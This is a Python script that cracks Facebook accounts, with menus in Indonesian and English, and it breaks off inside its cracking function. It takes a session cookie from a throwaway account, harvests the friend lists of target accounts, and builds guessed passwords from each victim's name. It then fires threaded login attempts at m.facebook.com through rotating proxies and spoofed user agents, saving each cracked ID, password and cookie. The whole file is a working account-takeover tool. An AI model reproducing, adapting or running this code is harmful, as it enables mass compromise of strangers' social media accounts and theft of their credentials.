#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Cannot Install Rich Module, Try Manual Install (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
import base64
exec(base64.b64decode(b'ZnJvbSByaWNoIGltcG9ydCBwcmludCBhcyBjZXRhaw=='))
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
# UA LIST
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

try:
	prox= requests.get('https://github.com/Customer112233/tes.txt/blob/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	print('GAGAL')
prox=open('.proxy.txt','r').read().splitlines()
#os.system('rm -rf .proxy.txt')

for xd in range(1000): 
	a='NokiaX2-00/5.0 (08.25)'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 UNTRUSTED/1.0'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
#	ugen2.append(uaku)

for jiah in range(1000):
	aa='Mozilla/5.0 (Linux; Android 9'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='SAMSUNG SM-A600FN Build/PPR1.180610.011'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(678, 9999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
#	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0  Chrome/'
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
#	uaku2=f'{aa} {b}; {c}{e}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
for bb in range(1000):
	a='BlackBerry7290'
	b=random.randrange(4000, 9999)
	c=random.randrange(1,6)
	d=random.choice(['0','1','2','3','4','5','6'])
	e='0'
	f=random.randrange(100, 999)
	g='Profile/MIDP-2.0'
	h='2'
	i=random.choice(['0','1'])
	j='Configuration/CLDC-1.1'
	k='Vendor/163'
	l=random.randrange(100, 999)
	ua=f'{a}{b}/{c}.{d}.{e}.{f} {g}{h}.{i} {j} {k}{l}'
	ugen2.append(ua)

def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()

# INDICATION
id,id2,loop,ok,cp,akun,oprek,method,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[]
lisensiku=['sukses']
cokbrut=[]
pwpluss,pwnya=[],[]

def cocok():
	try:
		cokbru=open('.cookie.txt').read()
		cokbrut.append(cokbru)
	except:
		login_lagi334()
# COLORS
x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
# Converter Bulan
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
tpc = 'TAP-A2F-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
# CLEAR
def clear():
	os.system('clear')
# BACK
def back():
	login()
# BANNER
def banner():
	clear()
	sol()
	ban=''' 

  ██████  ██░ ██  ██▓ ███▄    █ ▒███████▒▓██   ██▓
▒██    ▒ ▓██░ ██▒▓██▒ ██ ▀█   █ ▒ ▒ ▒ ▄▀░ ▒██  ██▒
░ ▓██▄   ▒██▀▀██░▒██▒▓██  ▀█ ██▒░ ▒ ▄▀▒░   ▒██ ██░
  ▒   ██▒░▓█ ░██ ░██░▓██▒  ▐▌██▒  ▄▀▒   ░  ░ ▐██▓░
▒██████▒▒░▓█▒░██▓░██░▒██░   ▓██░▒███████▒  ░ ██▒▓░
▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓  ░ ▒░   ▒ ▒ ░▒▒ ▓░▒░▒   ██▒▒▒ 
░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░░ ░░   ░ ▒░░░▒ ▒ ░ ▒ ▓██ ░▒░ 
░  ░  ░   ░  ░░ ░ ▒ ░   ░   ░ ░ ░ ░ ░ ░ ░ ▒ ▒ ░░  
      ░   ░  ░  ░ ░           ░   ░ ░     ░ ░     
                                ░         ░ ░     
'''             
	cetak(nel(ban, style='bold green'))

# VALIDASI TOKEN
def login():
	if 'sukses' in lisensiku:
#		uaku()
		cocok()
		try:
			token = open('.token.txt','r').read()
			tokenku.append(token)
			try:
				sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]})
				sy2 = json.loads(sy.text)['name']
				sy3 = json.loads(sy.text)['id']
				menu(sy2,sy3)
			except KeyError:
				login_lagi334()
			except requests.exceptions.ConnectionError:
				banner()
				li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
				lo = mark(li, style='red')
				sol().print(lo, style='white')
				exit()
		except IOError:
			login_lagi334()
	else:lisensi()

# LOGIN
def login_lagi334():
	banner()
	sky = '[bold cyan][01] LOGIN COOKIE V1\n[02] LOGIN COOKIE V2[/bold cyan]'
	sky2 = nel(sky, style='white')
#	cetak(nel(sky2,title='[bold bue] • LOGIN MENU • [/bold blue]'))
#	pil=input('[•] Choose : ')
	pil='1'
	if pil in ['1','01']:
		try:
			cik='# LOGIN USING COOKIE'
			cik2=mark(cik ,style='white')
			sol().print(cik2)
			cooki=input("Cookie : ")
			open('.cookie.txt','w').write(cooki)
			head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
			data = requests.get("https://business.facebook.com/business_locations", headers =head, cookies = {"cookie":cooki}) 
			find_token = re.search("(EAAG\w+)", data.text)
			ken=open(".token.txt", "w").write(find_token.group(1))
			cokrom=open('.cookie.txt','r').read()
			tokrom=open('.token.txt','r').read()
			tes = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokrom,cookies={'cookie': cokrom})
			tes3 = json.loads(tes.text)['id']
			cik='# LOGIN SUKSES , JALANKAN ULANG '
			cik2=mark(cik ,style='white')
			sol().print(cik2)
			login()
		except Exception as e: 
			os.system("rm -f .token.txt")
			os.system("rm -rf .cookie.txt")
			cik='# TUMBAL CECKPOINT , GANTI TUMBAL LAIN '
			cik2=mark(cik ,style='white')
			sol().print(cik2) 
			exit()
	elif pil in ['2','02']:
		try:
			cik='# LOGIN USING COOKIE V2 '
			cik2=mark(cik ,style='cyan')
			sol().print(cik2)
			cookie=input("[•] Cookie : ")
			headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
			ses=requests.Session()
			req = ses.get('https://web.facebook.com/adsmanager?_rdc=1&_rdr', headers = headers,cookies={'cookie': cookie})
			cari_id = re.findall('act=(.*?)&nav_source', req.text)
			for bn in cari_id:
				rex = ses.get(f'https://web.facebook.com/adsmanager/manage/campaigns?act={bn}&nav_source=no_referrer', headers = headers,cookies={'cookie': cookie})
				token = re.search('(EAAB\w+)', rex.text).group(1)
				ken=open(".token.txt", "w").write(token)
			cik='# LOGIN SUCCESSFUL, RUN AGAIN '
			cik2=mark(cik ,style='green')
			sol().print(cik2)
			exit()
		except Exception as e: 
			os.system("rm -f .token.txt")
			cik='# EXPIRED COOKIE OR CHECKPOINT ACCOUNT '
			cik2=mark(cik ,style='green')
			sol().print(cik2) 
			exit()



#VALIDASI LISENSI
def anoun():
	res=requests.Session().get('https://raw.githubusercontent.com/EC-1709/a/main/Anoun.json').json()
	stanoun=res['status']
	if stanoun== "ON":
		oi = nel(tekz(str(res['isi']), justify="center"), style='yellow')
		cetak(nel(oi, title='[bold cyan] • INFORMATION • [/bold cyan]'))
		cik='# PRESS ENTER TO CONTINUE'
		cik2=mark(cik ,style='cyan')
		sol().print(cik2)
		en=input(' ')
	else:pass
	login()
def tlisensi():
	banner()
	wel='# LICENSE IS NOT APPLICABLE OR WRONG'
	wel2 = mark(wel, style='red')
	sol().print(wel2)
	time.sleep(2)
	lisen=input('[•] Enter License : ')
	open('.lisen.txt','w').write(lisen)
	lisensi()


def lisensi():
	try:
		cek=open('.lisen.txt').read()
		lisensikuni.append(cek)
	except:
		tlisensi()
	ses=requests.Session()
	res=requests.get('https://app.cryptolens.io/api/key/Activate?token=WyIxNzgxNjQyOSIsIkI1a3JKY2tPQnVqZ2MzWGU2cXppSE5GOXZkalpaaUhoSlRFRzZNQ0YiXQ==&ProductId=15076&Key='+lisensikuni[0]).json()
	status=res['licenseKey']['key']
	if status ==cek:
		banner()
		wel='# LICENSE APPLICABLE '
		wel2 = mark(wel, style='cyan')
		sol().print(wel2)
		time.sleep(2)
		lisensiku.append("sukses")
	else:
		tlisensi()
	anoun()

# MENU
def menu(my_name,my_id):
	try:sh = requests.get('https://httpbin.org/ip').json()
	except:sh = {'origin':'-'}
	try:
		tglx = my_birthday.split('/')[1]
		blnx = dic2[str(my_birthday.split('/')[0])]
		thnx = my_birthday.split('/')[2]
		birth = tglx+' '+blnx+' '+thnx
	except:birth = '-'
	banner()
	sg = '# >>> INFORMASI AKUN TUMBAL ANDA <<< '
	fx = mark(sg, style=' bold yellow')
	sol().print(fx)
	print(x+'['+h+'•'+x+'] NAMA : '+str(my_name))
	print(x+'['+h+'•'+x+'] ID   : '+str(my_id))
	print(x+'['+h+'•'+x+'] IP   : '+str(sh['origin']))
	io = '''[yellow]
[01] CRACK PUBLIK
[02] CRACK MASSAL
[03] CHECK HASIL 
[00] EXIT[bold green]'''

	oi = nel(io, style='bold yellow')
	cetak(nel(oi, title='[bold yellow] >>> MENU <<< [/bold yellow]'))
	ec = input(x+'['+p+'Silent'+x+'] Pilih : ')
	if ec in ['1','01']:
		dump_publik()
	elif ec in ['2','02']:
		dump_massal()
	elif ec in ['3','03']:
		result()
	elif ec in ['0','00']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(x+'['+h+'•'+x+'] WAIT • • •')
		time.sleep(1)
		sw = '# SUCCESS OUT'
		sol().print(mark(sw, style='white'))
		exit()
	else:
		ric = '# OPTION NOT IN THE MENU'
		sol().print(mark(ric, style='white'))
		exit()

# RESULT CHECKER
def result():
	cek = '# CEK RESULT CRACK'
	sol().print(mark(cek, style='white'))
	kayes = '[bold cyan][01] CHECK CP RESULTS\n[02] CHECK OK RESULTS\n[00] BACK TO MENU[/bold cyan]'
	kis = nel(kayes, style='white')
	cetak(nel(kis, title='RESULTS'))
	kz = input(x+'['+p+'Silent'+x+'] Pilih : ')
	if kz in ['1','01']:
		try:vin = os.listdir('/sdcard/4MBF-DATA/CP')
		except FileNotFoundError:
			gada = '# STORAGE NOT FOUND '
			sol().print(mark(gada, style='white'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# YOU DONT HAVE CP RESULTS'
			sol().print(mark(haha, style='white'))
			time.sleep(2)
			back()
		else:
			gerr = '# YOUR CP RESULT'
			sol().print(mark(gerr, style='white'))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/4MBF-DATA/CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			gerr2 = '# SELECT RESULTS TO SHOW'
			sol().print(mark(gerr2, style='white'))
			geeh = input(x+'['+p+'Silent'+x+'] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# OPTION NOT IN THE MENU'
				sol().print(mark(ric, style='white'))
				exit()
			try:lin = open('/sdcard/4MBF-DATA/CP/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='white'))
				time.sleep(2)
				back()
			akun = '# YOUR CP ACCOUNT RESULT'
			sol().print(mark(akun, style='white'))
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			akun2 = '# YOUR CP ACCOUNT RESULT'
			sol().print(mark(akun, style='cyan'))
			input('[PRESS ENTER TO RETURN]')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('/sdcard/4MBF-DATA/OK')
		except FileNotFoundError:
			gada = '# STORAGE NOT FOUND '
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# YOU DONT HAVE OK RESULTS'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			gerr = '# YOUR OK RESULT'
			sol().print(mark(gerr, style='green'))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/4MBF-DATA/OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			gerr2 = '# SELECT RESULTS TO SHOW'
			sol().print(mark(gerr2, style='green'))
			geeh = input(x+'['+p+'Silent'+x+'] Choose : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# OPTION NOT IN THE MENU'
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/4MBF-DATA/OK/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()
			akun = '# YOUR OK ACCOUNT RESULT'
			sol().print(mark(akun, style='green'))
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}COOKIE : {x}{cpkuni[2]}')
				nocp +=1
			akun2 = '# YOUR OK ACCOUNT RESULT'
			sol().print(mark(akun, style='green'))
			input('[PRESS ENTER TO RETURN]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		ric = '# OPTION NOT IN THE MENU'
		sol().print(mark(ric, style='red'))
		exit()

# OPEN
def file():
	tek = '# CHECK CEKPOINT FROM FILE'
	sol().print(mark(tek, style='white'), style='on red')
	print(x+'['+h+'Silent'+x+'] READING THE FILE, WAIT A MINUTE •••')
	time.sleep(2)
	teks = '# SELECT FILES TO CHECK'
	sol().print(mark(teks, style='white'))
	my_files = []
	try:
		lis = os.listdir('/sdcard/4MBF-DATA/CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	if len(my_files)==0:
		yy = '# YOU DONT HAVE THE RESULTS TO CHECK'
		sol().print(mark(yy, style='white'))
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('/sdcard/4MBF-DATA/CP/'+isi,'r').readlines()
			except:
				try:hem = open('/sdcard/4MBF-DATA/OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
		teks2 = '# SELECT FILES TO CHECK'
		sol().print(mark(teks2, style='white'))
		geeh = input(x+'['+p+'Silent'+x+'] Choose : ')
		try:geh = lol[geeh]
		except KeyError:
			ric = '# OPTION NOT IN THE MENU'
			sol().print(mark(ric, style='red'))
			exit()
		try:
			hf = open('/sdcard/4MBF-DATA/CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('/sdcard/4MBF-DATA/OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()

# DUMP ID PUBLIK
def dump_publik():
	try:
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	win = '# DUMP PUBLIK '
	win2 = mark(win, style='bold yellow')
	sol().print(win2)
	print(x+'['+h+'Silent'+x+'] KETIK"me" UNTUK CRACK TEMAN AKUN TUMBAL')
	pil = input(x+'['+p+'f'+x+'] MASUKAN TARGET ID : ')
	dumpdump(pil)
	print(x+'['+h+'•'+x+'] TOTAL : '+str(len(id)))
	setting()
def dumpdump(pil):
	try:
		head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000){id,name}&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]},headers=head).json()
		try:
			kohe=koh2['friends']['paging']['cursors']['before']
		except:
			pass
		for pi in koh2['friends']['data']:
			try:
				iso=(pi['id']+'|'+pi['name']+'|'+pi['birthday'])
				if iso in id:pass
				else:id.append(iso)
			except:
				iso=(pi['id']+'|'+pi['name'])
				if iso in id:pass
				else:id.append(iso)
				continue
	except requests.exceptions.ConnectionError:
		li = '# PROBLEM INTERNET CONNECTION,PRESS ENTER TO CONTINUE'
		lo = mark(li, style='white')
		sol().print(lo, style='white')
		input('')
	except (KeyError,IOError):
			pass
# DUMP ID MASSAL
def dump_massal():
	mas='[01] CRAK MASSAL DARI FILE\n[02] CRACK PUBLIK MASSAL'
	mas2=nel(mas,style='yellow')
	cetak(nel(mas2,title=' • CRACK MASSAL •'))
	pilih=input('[•] PILIH : ')
	if pilih in ['1','01']:
		nmfil=input('[•] File Name : ')
		nmfile=open(nmfil,'r').read().splitlines()
		for xfil in nmfile:
			uid.append(xfil)
	elif pilih in ['2','02']:
		print(x+'['+h+'•'+x+'] MAKSIMAL [20]')
		try:
			jum = int(input(x+'['+p+'f'+x+']TOTAL TARGET : '))
		except ValueError:
			pesan = '# THE INPUT YOU ENTER IS NOT A NUMBERS'
			pesan2 = mark(pesan, style='red')
			sol().print(pesan2)
			exit()
		if jum<1 or jum>20:
			pesan = '# OUT OF RANGE MEN'
			pesan2 = mark(pesan, style='red')
			sol().print(pesan2)
			exit()
		ses=requests.Session()
		yz = 0
		print(x+'['+h+'•'+x+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FRIENDS')
		for met in range(jum):
			yz+=1
			kl = input(x+'['+h+str(yz)+x+'] TARGET ID KE '+str(yz)+' : ')
			uid.append(kl)
	sed='# MENGUMPULKAN ID TARGET'
	sol().print(mark(sed, style='yellow'))
	for userr in uid:
		dumpdump(userr)
	tot = '# TOTAL TARGET  %s ID'%(len(id))
	if len(id)==0:
		tot2 = mark(tot, style='yellow')
	else:
		tot2 = mark(tot, style='yellow')
	sol().print(tot2)
	setting()


# PENGATURAN ID
def setting():
	wl = '# PILIH URUTAN TAHUN AKUN'
	sol().print(mark(wl, style='bold yellow'))
	teks = '[01] ID TERTUA\n[02] ID TERMUDA\n[03] ID RANDOM'
	tak = nel(teks, style='yellow')
	cetak(nel(tak, title=''))
	hu = input(x+'['+p+'f'+x+'] Pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		ric = '# OPTION NOT IN THE MENU'
		sol().print(mark(ric, style='bold white'))
		exit()
	met = '# PILIH METHOD CRACK'
	sol().print(mark(met, style='bold yellow'))
	ioz = '[01] MOBILE'
	gess = nel(ioz, style='yellow')
	cetak(nel(gess, title=''))
	hc = input(x+'['+p+'f'+x+']  : ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	guw = '# TAMPILKAN APLIKASI TERKAIT ? (y/t)'
	sol().print(mark(guw, style='yellow'))
	aplik = input(x+'['+p+'f'+x+'] y/t : ')
	if aplik in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	guw = '# TAMPILKAN AKUN CECKPOINT ? (y/t)'
	sol().print(mark(guw, style='yellow'))
	cpres = input(x+'['+p+'f'+x+'] y/t : ')
	if cpres in ['y','Y']:
		princp.append('ya')
	else:
		princp.append('no')
	guw = '# PASSWORD TAMBAHAN ? (y/t)'
	sol().print(mark(guw, style='yellow'))
	pwplus=input(x+'['+p+'f'+x+'] y/t : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		krek = '[•] GUNAKAN KOMA SEBAGAI PEMBATAS PASSWORD\n[•] GUNAKAN MINIMAL 6 HURUF/ANGKA SEBAGAI PASSWORD\n[•] CONTOH : sayang,sayangku,cantik,doraemon,bismillah'
		cetak(nel(krek, title=' •PASSWORD TAMBAHAN• '))
		pwku=input('MASUKAN PASSWORD : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()

# WORDLIST
def passwrd():
	ler = '# CRACK BERJALAN , ON/OFF MODE PESAWAT 5 DETIK JIKA TIDAK ADA HASIL'
	sol().print(mark(ler, style='bold yellow'))
	with tred(max_workers=15) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
	print('')
	tanya = '# CRACK SELESAI , JALANKANKAN PERINTAH ULANG'
	sol().print(mark(tanya, style='green'))

# CRACKER
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s└── %s|%s|OK:%s|CP:%s|%s%s%s   '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
